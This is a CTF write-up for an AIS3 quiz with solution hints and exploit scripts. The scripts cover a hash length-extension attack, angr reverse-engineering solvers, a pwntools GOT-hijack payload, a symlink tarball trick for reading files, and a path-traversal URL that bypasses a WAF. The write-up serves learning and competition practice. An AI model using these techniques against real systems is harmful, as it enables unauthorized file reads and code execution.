## Misc 1

Open the url and prompt the flag.

## Misc 2

It's a 7zip chain... Modify each byte from 0x5a to 0x7z at offset 0x01, and then you'll be able to decompress it with password, which is shown as the filename or the content of the other unencrpyted file.

## Misc 3

It's just like [this case](http://josipfranjkovic.blogspot.tw/2014/12/reading-local-files-from-facebooks.html) happened to Facebook. You create a symlink named `guess.txt` to `../flag.txt`, then you add this symlink to tarball file and upload it to quiz server. You should bypass sha1sum's validation.

## Crypto 1

[xortool](https://github.com/hellman/xortool) is enough. Try to be patient to find out where the flag is.

## Crypto 2

### Intended Solution

It's a [Length Extension Attack](www.freebuf.com/articles/web/31756.html) problem. Following is my example exploit script:

```python
from hashpumpy import hashpump
import requests
import urlparse
import re

for i in xrange(61):
	mac, ext = hashpump('41fe78ff2c2c51e758bf4501fd8e6a9b8d478f4e', 'expire=1467391984', '&expire=2577390020', i)

	ext = urlparse.parse_qs(ext)

	r = requests.get('https://quiz.ais3.org:8014/', params=[('expire', ext["expire"][0]), ('expire', ext["expire"][1]), ('auth', mac)])

	failed = re.search('<div id="flag">.*ais3{.*', r.content)
	if failed:
		print "{}: {}".format(i, failed.group())
		break
```

### Unintended Solution

Because quiz server do not check the situation that ones can reuse the values of auth and expire that server gave after redirection, we can just reuse those values and append `&expire=9999999999` to the end of the url. Voila, we get the flag.

## Crypto 3

TBA.

## Binary 1

I use [angr](https://github.com/angr/angr) to solve the problem. Following is my example exploit script:

```python
import angr

proj = angr.Project('./rev')

argv1 = angr.claripy.BVS("argv1",30*8)
initial_state = proj.factory.path(args=["./rev", argv1])

path_group = proj.factory.path_group(initial_state)

path_group.explore(find=0x4006d7, avoid=0x4006cd) 

solution = path_group.found[0].state.se.any_str(argv1)

solution = solution[:solution.find("\x00")]
print solution
```

## Binary 2

It's a 64-bit machine code. You can get it presented as byte-to-byte form through: ```echo -e "..." | hexdump -e '"\\\x" /1  "%02x"'```.

## Binary 3

I use [angr](https://github.com/angr/angr) to solve the problem. Following is my example exploit script:

```python
import angr
import re

def main():
    proj = angr.Project('./caaaaalculate',  load_options={'auto_load_libs': False})

    state = proj.factory.blank_state(addr=0x402439) # main

    stdin = state.se.BVS("stdin", 30 * 8)

    k = []
    ans = []

    # Constrain 30 bytes char to be non-null and non-newline:
    for i in xrange(30):
        k.append(state.posix.files[0].read_from(1))
        state.se.add(k[i] != 0)
        state.se.add(k[i] != 10)

    # Reset the symbolic stdin's properties and set its length.
    state.posix.files[0].seek(0)
    state.posix.files[0].length = 30

    path_group = proj.factory.path_group(state, threads=4)

    path_group.explore(find=0x402487, avoid=0x40247d)

    for i, item in enumerate(k):
        ans.append(path_group.found[0].state.se.any_str(item))

    ans = ''.join(ans)

    return re.search('ais3{.+}', ans).group(0)


if __name__ == '__main__':
    print main()

```

## Remote 1

You can follow [this write-up](http://mslc.ctf.su/wp/plaidctf-2012-format-99-pwnables/) to get how to solve this problem.

## Remote 2

The program will ask you to give itself your name up to 100 bytes, and if you disassemble it, you'll find the last four bytes will be passed as store address of first scanf function. Thus, you can `readelf -r ./remote2` to check GOT addresses of all functions, and your last four bytes should be replace by any of addresses. Then, you can GOT hijack the program to jump to any position depending on your input passing to the first scanf. Following is my example exploit script:

```python
from pwn import *

r = remote('quiz.ais3.org', 53125)
print r.recv()
r.sendline('A'*96 + p32(0x0804a038))
print r.recv()
r.sendline(str(0x080486d9))
print r.recvall()
```

## Remote 3

TBA.

## Web 1

It's because `robots.txt` that Google bot cannot do anything.

## Web 2

Because there is not exit statement below header function, the script execution is not terminated. [noredirect addon](https://addons.mozilla.org/en-US/firefox/addon/noredirect/) can help you in this situation.

## Web 3

Since the argument passed into parse_url function is $_SERVER['REQUEST_URI'], we can just prepend some slashes to the beginning of the root path. Thus, we can bypass waf and get flag printed.

For instance, `https://quiz.ais3.org:8013///download.php?p=../flag.php`.
